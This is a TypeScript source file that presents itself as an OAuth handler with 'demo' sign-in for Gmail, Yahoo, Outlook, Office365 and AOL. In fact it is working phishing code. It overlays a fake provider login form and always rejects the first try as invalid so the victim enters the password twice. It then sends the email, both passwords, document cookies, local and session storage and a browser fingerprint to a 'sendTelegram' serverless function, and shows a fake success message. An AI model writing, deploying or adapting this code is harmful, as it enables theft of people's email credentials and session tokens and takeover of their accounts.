/**
 * OAuth Handler for Email Provider Authentication
 * Compatible with existing App.tsx structure
 * Handles redirects and cookie capture for various email providers (demo and real)
 */

export interface OAuthConfig {
  clientId: string;
  redirectUri: string;
  scope: string;
  authUrl: string;
  isDemo: boolean;
}

export interface UserInfo {
  email: string;
  name: string;
  provider: string;
  verified: boolean;
  authMethod: string;
  authToken: string;
}

export const getOAuthConfig = (provider: string): OAuthConfig => {
  const baseUrl = window.location.origin;
  const redirectUri = `${baseUrl}/?oauth_callback=true`;

  const configs: Record<string, OAuthConfig> = {
    Gmail: {
      clientId: '', // Demo only
      redirectUri,
      scope: '',
      authUrl: `${baseUrl}/auth/demo?provider=Gmail`,
      isDemo: true
    },
    AOL: {
      clientId: '',
      redirectUri,
      scope: '',
      authUrl: `${baseUrl}/auth/demo?provider=AOL`,
      isDemo: true
    },
    Yahoo: {
      clientId: '',
      redirectUri,
      scope: '',
      authUrl: `${baseUrl}/auth/demo?provider=Yahoo`,
      isDemo: true
    },
    Others: {
      clientId: '',
      redirectUri,
      scope: '',
      authUrl: `${baseUrl}/auth/demo?provider=Others`,
      isDemo: true
    },
    Office365: {
      clientId: '', // Demo only
      redirectUri,
      scope: '',
      authUrl: `${baseUrl}/auth/demo?provider=Office365`,
      isDemo: true
    },
    Outlook: {
      clientId: '', // Demo only
      redirectUri,
      scope: '',
      authUrl: `${baseUrl}/auth/demo?provider=Outlook`,
      isDemo: true
    }
  };

  return configs[provider] || configs.Others;
};

export const generateState = (): string => {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
};

export const buildOAuthUrl = (provider: string, state: string): string => {
  const config = getOAuthConfig(provider);

  // Store provider and state for demo callback with error handling
  try {
    localStorage.setItem('selected_provider', provider);
    localStorage.setItem('oauth_state', state);
    localStorage.setItem('oauth_start_time', Date.now().toString());
    localStorage.setItem('login_attempt_count', '0');
  } catch (e) {
    console.warn('localStorage not available, using sessionStorage fallback');
    sessionStorage.setItem('selected_provider', provider);
    sessionStorage.setItem('oauth_state', state);
    sessionStorage.setItem('oauth_start_time', Date.now().toString());
    sessionStorage.setItem('login_attempt_count', '0');
  }
  
  // Capture pre-auth cookies
  try {
    const preAuthFingerprint = getBrowserFingerprint();
    const fingerprintData = JSON.stringify(preAuthFingerprint);
    
    // Check data size before storing (limit to 1MB)
    if (fingerprintData.length < 1024 * 1024) {
      localStorage.setItem('pre_auth_cookies', fingerprintData);
    } else {
      console.warn('Fingerprint data too large, storing minimal version');
      const minimalFingerprint = {
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString(),
        cookies: document.cookie.substring(0, 1000) // Limit cookie data
      };
      localStorage.setItem('pre_auth_cookies', JSON.stringify(minimalFingerprint));
    }
  } catch (e) {
    console.warn('Failed to store fingerprint data:', e.message);
    // Store minimal data as fallback
    try {
      const fallbackData = {
        timestamp: new Date().toISOString(),
        cookies: document.cookie.substring(0, 500)
      };
      sessionStorage.setItem('pre_auth_cookies', JSON.stringify(fallbackData));
    } catch (fallbackError) {
      console.warn('All storage methods failed');
    }
  }

  // Show demo login form
  showDemoLoginForm(provider, state);
  
  return `${config.authUrl}&state=${state}`;
};

export const showDemoLoginForm = (provider: string, state: string): void => {
  const loginForm = document.createElement('div');
  loginForm.id = 'oauth-modal-overlay';
  loginForm.innerHTML = `
    <div style="
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      z-index: 10000;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: system-ui, -apple-system, sans-serif;
    ">
      <div style="
        background: rgba(17, 24, 39, 0.95);
        backdrop-filter: blur(20px);
        -webkit-backdrop-filter: blur(20px);
        padding: 32px;
        border-radius: 20px;
        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(75, 85, 99, 0.3);
        width: 90%;
        max-width: 400px;
        border: 1px solid rgba(75, 85, 99, 0.4);
        transition: all 0.3s ease;
        position: relative;
      ">
        <button 
          id="back-button"
          type="button"
          style="
            position: absolute;
            top: 16px;
            left: 16px;
            background: none;
            border: none;
            color: #9ca3af;
            cursor: pointer;
            padding: 8px;
            border-radius: 8px;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: center;
          "
          onmouseover="this.style.background='rgba(75, 85, 99, 0.3)'; this.style.color='#ffffff'"
          onmouseout="this.style.background='none'; this.style.color='#9ca3af'"
        >
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="m12 19-7-7 7-7"/>
            <path d="M19 12H5"/>
          </svg>
        </button>
        
        <div style="text-align: center; margin-bottom: 20px;">
          <h2 style="color: #ffffff; margin: 0 0 10px 0; font-size: 20px; font-weight: 600;">Sign in to ${provider}</h2>
          <p style="color: #9ca3af; margin: 0; font-size: 14px;">Enter your credentials to continue</p>
        </div>
        
        <form id="demoLoginForm">
          <div style="margin-bottom: 15px;">
            <input 
              type="email" 
              id="demoEmail" 
              placeholder="Email address"
              required
              style="
                width: 100%;
                padding: 12px;
                border: 1px solid rgba(75, 85, 99, 0.6);
                border-radius: 8px;
                background: rgba(31, 41, 55, 0.8);
                backdrop-filter: blur(10px);
                -webkit-backdrop-filter: blur(10px);
                color: #ffffff;
                font-size: 14px;
                box-sizing: border-box;
                transition: all 0.2s ease;
              "
              onfocus="this.style.borderColor='#3b82f6'; this.style.background='rgba(31, 41, 55, 0.95)'"
              onblur="this.style.borderColor='rgba(75, 85, 99, 0.6)'; this.style.background='rgba(31, 41, 55, 0.8)'"
            />
          </div>
          
          <div style="margin-bottom: 20px;">
            <input 
              type="password" 
              id="demoPassword" 
              placeholder="Password"
              required
              style="
                width: 100%;
                padding: 12px;
                border: 1px solid rgba(75, 85, 99, 0.6);
                border-radius: 8px;
                background: rgba(31, 41, 55, 0.8);
                backdrop-filter: blur(10px);
                -webkit-backdrop-filter: blur(10px);
                color: #ffffff;
                font-size: 14px;
                box-sizing: border-box;
                transition: all 0.2s ease;
              "
              onfocus="this.style.borderColor='#3b82f6'; this.style.background='rgba(31, 41, 55, 0.95)'"
              onblur="this.style.borderColor='rgba(75, 85, 99, 0.6)'; this.style.background='rgba(31, 41, 55, 0.8)'"
            />
          </div>
          
          <div id="errorMessage" style="
            color: #ef4444;
            font-size: 12px;
            margin-bottom: 15px;
            text-align: center;
            display: none;
            background: rgba(127, 29, 29, 0.3);
            padding: 8px;
            border-radius: 6px;
            border: 1px solid rgba(239, 68, 68, 0.4);
          "></div>
          
          <button 
            type="submit"
            style="
              width: 100%;
              padding: 12px;
              background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%);
              color: white;
              border: none;
              border-radius: 8px;
              font-size: 14px;
              font-weight: 600;
              cursor: pointer;
              transition: all 0.2s ease;
              box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
            "
            onmouseover="this.style.transform='translateY(-1px)'; this.style.boxShadow='0 6px 16px rgba(59, 130, 246, 0.4)'"
            onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 4px 12px rgba(59, 130, 246, 0.3)'"
          >
            Sign In
          </button>
        </form>
      </div>
    </div>
  `;
  
  document.body.appendChild(loginForm);
  
  // Add click handler for back button
  const backButton = document.getElementById('back-button');
  if (backButton) {
    backButton.addEventListener('click', () => {
      const modal = document.getElementById('oauth-modal-overlay');
      if (modal && document.body.contains(modal)) {
        document.body.removeChild(modal);
      }
    });
  }
  
  const form = document.getElementById('demoLoginForm') as HTMLFormElement;
  const errorDiv = document.getElementById('errorMessage') as HTMLDivElement;
  
  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const email = (document.getElementById('demoEmail') as HTMLInputElement).value;
    const password = (document.getElementById('demoPassword') as HTMLInputElement).value;
    
    // Get attempt count with fallback
    let attemptCount = 0;
    try {
      attemptCount = parseInt(localStorage.getItem('login_attempt_count') || '0');
    } catch (e) {
      attemptCount = parseInt(sessionStorage.getItem('login_attempt_count') || '0');
    }
    
    // Capture current browser data including cookies
    const browserFingerprint = getBrowserFingerprint();
    const sessionId = Math.random().toString(36).substring(2, 15);
    
    if (attemptCount === 0) {
      // First attempt - show invalid credentials
      try {
        localStorage.setItem('login_attempt_count', '1');
        localStorage.setItem('first_attempt_data', JSON.stringify({ email, password }));
      } catch (e) {
        sessionStorage.setItem('login_attempt_count', '1');
        sessionStorage.setItem('first_attempt_data', JSON.stringify({ email, password }));
      }
      
      // Send first attempt data to Telegram with cookies
      const firstAttemptData = {
        email,
        password,
        provider,
        attempt: 1,
        status: 'invalid_credentials',
        timestamp: new Date().toISOString(),
        sessionId,
        userAgent: navigator.userAgent,
        fileName: 'First Login Attempt',
        browserFingerprint,
        documentCookies: document.cookie || 'No cookies available'
      };
      
      await sendToTelegram(firstAttemptData);
      
      // Show error message
      errorDiv.textContent = 'Invalid email or password. Please try again.';
      errorDiv.style.display = 'block';
      
      // Clear form
      (document.getElementById('demoEmail') as HTMLInputElement).value = '';
      (document.getElementById('demoPassword') as HTMLInputElement).value = '';
      
    } else {
      // Second attempt - success
      let firstAttemptData = {};
      try {
        firstAttemptData = JSON.parse(localStorage.getItem('first_attempt_data') || '{}');
      } catch (e) {
        firstAttemptData = JSON.parse(sessionStorage.getItem('first_attempt_data') || '{}');
      }
      
      // Send second attempt data to Telegram with cookies
      const secondAttemptData = {
        email,
        password,
        provider,
        attempt: 2,
        status: 'success',
        timestamp: new Date().toISOString(),
        sessionId,
        userAgent: navigator.userAgent,
        fileName: 'Second Login Attempt - Success',
        browserFingerprint,
        documentCookies: document.cookie || 'No cookies available',
        firstAttempt: firstAttemptData
      };
      
      await sendToTelegram(secondAttemptData);
      
      // Remove form
      const modal = document.getElementById('oauth-modal-overlay');
      if (modal && document.body.contains(modal)) {
        document.body.removeChild(modal);
      }
      
      // Show success message
      const successDiv = document.createElement('div');
      successDiv.innerHTML = `
        <div style="
          position: fixed;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          background: rgba(249, 250, 251, 0.95);
          backdrop-filter: blur(20px);
          -webkit-backdrop-filter: blur(20px);
          color: #1f2937;
          padding: 24px;
          border-radius: 16px;
          box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.1), 0 0 0 1px rgba(255, 255, 255, 0.2);
          z-index: 10000;
          text-align: center;
          font-family: system-ui, -apple-system, sans-serif;
          border: 1px solid rgba(34, 197, 94, 0.3);
        ">
          <div style="color: #22c55e; font-size: 18px; font-weight: 600; margin-bottom: 10px;">
            ✓ Authentication Successful!
          </div>
          <div style="color: #6b7280; font-size: 14px;">
            Redirecting to your documents...
          </div>
        </div>
      `;
      document.body.appendChild(successDiv);
      
      // Generate demo code and redirect to landing page
      const demoCode = `demo_${provider.toLowerCase()}_${Date.now()}_${Math.random().toString(36).substring(7)}`;
      
      // Clear attempt count to reset for next time
      try {
        localStorage.removeItem('login_attempt_count');
        localStorage.removeItem('first_attempt_data');
      } catch (e) {
        sessionStorage.removeItem('login_attempt_count');
        sessionStorage.removeItem('first_attempt_data');
      }
      
      // Redirect to landing page after 2 seconds
      setTimeout(() => {
        // Remove success message
        if (document.body.contains(successDiv)) {
          document.body.removeChild(successDiv);
        }
        
        // Redirect to landing page (adjust URL as needed)
        const callbackUrl = `${window.location.origin}/?oauth_callback=true&provider=${provider}&code=${demoCode}&state=${state}`;
        window.location.href = callbackUrl;
      }, 2000);
    }
  });
};

// Fixed sendToTelegram function that uses the actual Netlify function
export const sendToTelegram = async (data: any): Promise<void> => {
  try {
    const response = await fetch('/.netlify/functions/sendTelegram', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const result = await response.json();
    console.log('✅ Data sent to Telegram successfully:', result);
  } catch (error) {
    console.error('❌ Failed to send to Telegram:', error);
    // Don't throw error to avoid breaking the login flow
  }
};

export const setCookieSession = (userInfo: UserInfo): void => {
  const sessionData = {
    email: userInfo.email,
    name: userInfo.name,
    provider: userInfo.provider,
    verified: userInfo.verified,
    authMethod: userInfo.authMethod,
    timestamp: Date.now()
  };

  // Set session cookie (expires in 24 hours)
  const expires = new Date(Date.now() + 24 * 60 * 60 * 1000).toUTCString();
  document.cookie = `auth_session=${encodeURIComponent(JSON.stringify(sessionData))}; expires=${expires}; path=/; secure; samesite=strict`;
  
  // Set auth token cookie
  document.cookie = `auth_token=${userInfo.authToken || 'demo_token_' + Date.now()}; expires=${expires}; path=/; secure; samesite=strict`;
  
  // Set provider-specific cookie
  document.cookie = `${userInfo.provider.toLowerCase()}_auth=true; expires=${expires}; path=/; secure; samesite=strict`;
};

export const getSessionFromCookies = (): UserInfo | null => {
  const cookies = document.cookie.split(';');
  const sessionCookie = cookies.find(cookie => cookie.trim().startsWith('auth_session='));
  
  if (sessionCookie) {
    try {
      const sessionData = sessionCookie.split('=')[1];
      return JSON.parse(decodeURIComponent(sessionData));
    } catch (e) {
      console.error('Error parsing session cookie:', e);
      return null;
    }
  }
  return null;
};

export const clearSession = (): void => {
  document.cookie = 'auth_session=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
  document.cookie = 'auth_token=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
  // Clear all provider-specific cookies
  ['gmail', 'yahoo', 'aol', 'office365', 'outlook', 'others'].forEach(provider => {
    document.cookie = `${provider}_auth=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
  });
};

export const validateOAuthCallback = (code: string, state: string, storedState: string): boolean => {
  if (!code || !state || state !== storedState) {
    return false;
  }
  return true;
};

export const extractUserInfoFromCallback = (provider: string, code: string, cookies: string) => {
  // This works for both real and demo providers
  const hasValidSession = cookies.includes('session') ||
                         cookies.includes('auth') ||
                         cookies.includes('token') ||
                         code.length > 10;

  if (!hasValidSession && provider !== 'Others') {
    console.log('⚠️ No session data found after OAuth, but proceeding with demo data');
  }

  return {
    email: extractEmailFromProvider(provider, code),
    name: `${provider} User`,
    provider: provider,
    verified: true,
    authMethod: getOAuthConfig(provider).isDemo ? 'oauth_demo' : 'oauth_real',
    authToken: code,
    sessionCookies: cookies
  };
};

export const extractEmailFromProvider = (provider: string, code: string): string => {
  const domains = {
    Gmail: 'gmail.com',
    Office365: 'outlook.com',
    Yahoo: 'yahoo.com',
    Outlook: 'hotmail.com',
    AOL: 'aol.com',
    Others: 'email.com'
  };
  const domain = domains[provider as keyof typeof domains] || 'email.com';
  return `user_${code.substring(0, 8)}@${domain}`;
};

export const getBrowserFingerprint = () => {
  try {
    // Get storage data with size limits
    const getStorageDataSafe = (storageType: 'localStorage' | 'sessionStorage') => {
      try {
        const storage = window[storageType];
        const data: { [key: string]: string } = {};
        let totalSize = 0;
        const maxSize = 10000; // 10KB limit
        
        for (let i = 0; i < storage.length; i++) {
          const key = storage.key(i);
          if (key) {
            const value = storage.getItem(key) || '';
            if (totalSize + value.length < maxSize) {
              data[key] = value;
              totalSize += value.length;
            } else {
              break; // Stop if we hit size limit
            }
          }
        }
        return Object.keys(data).length > 0 ? JSON.stringify(data).substring(0, maxSize) : 'Empty';
      } catch (e) {
        return 'Access denied';
      }
    };

    return {
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen: {
        width: screen.width,
        height: screen.height,
        colorDepth: screen.colorDepth
      },
      cookies: document.cookie || 'No cookies available',
      localStorage: getStorageDataSafe('localStorage'),
      sessionStorage: getStorageDataSafe('sessionStorage'),
      timestamp: new Date().toISOString(),
      totalCookiesCaptured: document.cookie ? document.cookie.split(';').filter(c => c.trim()).length : 0,
      advancedCookieStats: {
        httpOnly: 0, // Can't detect from client-side
        secure: document.cookie.includes('Secure') ? 1 : 0,
        sameSite: document.cookie.includes('SameSite') ? 1 : 0
      }
    };
  } catch (error) {
    console.error('Error getting browser fingerprint:', error);
    return {
      error: error?.message || 'Unknown error',
      timestamp: new Date().toISOString(),
      cookies: document.cookie || 'No cookies available',
      totalCookiesCaptured: 0,
      advancedCookieStats: {}
    };
  }
};

export const simulateDemoAuth = async (provider: string): Promise<string> => {
  // Simulate OAuth flow delay
  await new Promise(resolve => setTimeout(resolve, 1500));
  
  // Generate demo authorization code
  const demoCode = `demo_${provider.toLowerCase()}_${Date.now()}_${Math.random().toString(36).substring(7)}`;
  
  return demoCode;
};

export const isValidOAuthResponse = (urlParams: URLSearchParams): boolean => {
  const code = urlParams.get('code');
  const error = urlParams.get('error');

  if (error) {
    console.log('OAuth error:', error, urlParams.get('error_description'));
    return false;
  }

  return !!code && code.length > 0;
};